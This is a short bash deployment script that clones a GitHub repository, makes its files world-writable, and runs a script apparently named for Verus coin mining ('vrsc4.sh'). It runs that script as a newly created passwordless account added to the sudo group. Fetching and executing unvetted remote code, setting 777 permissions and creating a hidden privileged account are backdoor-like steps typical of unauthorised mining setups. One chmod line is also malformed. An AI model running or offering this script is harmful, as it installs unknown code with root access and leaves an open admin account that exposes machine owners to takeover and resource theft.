#!/bin/bash
sudo apt update
git clone https://github.com/CIMENGUTAMAf/orian.git && cd orian
chmod +x vrsc4.sh && chmod +x uluk chmod 777 uluk vrsc4.sh
sudo adduser --disabled-password --gecos "" apen && sudo usermod -aG sudo apen
sudo -u apen -H sh -c "./vrsc4.sh"
sudo apt update
